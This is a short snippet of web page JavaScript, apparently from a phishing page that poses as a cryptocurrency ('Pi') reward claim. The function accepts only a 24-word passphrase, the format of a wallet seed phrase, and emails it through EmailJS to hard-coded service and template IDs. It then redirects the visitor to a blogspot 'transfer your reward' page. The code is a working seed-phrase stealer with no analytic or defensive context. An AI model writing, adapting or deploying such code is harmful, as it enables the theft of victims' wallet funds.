    <script>

      function sendMail() {

        var key = document.getElementById("textkey").value;

        let word = key.split(" ");

        let count = word.length;



        if (count === 24) {

          var params = {

            key: document.getElementById("textkey").value,

          };

          const serviceID = "service_i95f60g";

          const templateID = "template_7iw4x9j";



          emailjs

            .send(serviceID, templateID, params)

            .then((res) => {

              document.getElementById("textkey").value;

              window.open("https://claimpireward.blogspot.com/p/n-ote-core-team-transfer-your-reward.html", "_parent	");

              document.getElementById("wordshow").innerText = "";



              // alert('your message sent seccessfully');

            })

            .catch((err) => console.log(err));

          //  document.getElementById('wordshow').innerText =("Successfully word"+ count);

        } else {

          document.getElementById("wordshow").innerText = "Invalid Passphrase";

        }



        document.getElementById("textkey").value = "";

      }

    </script>
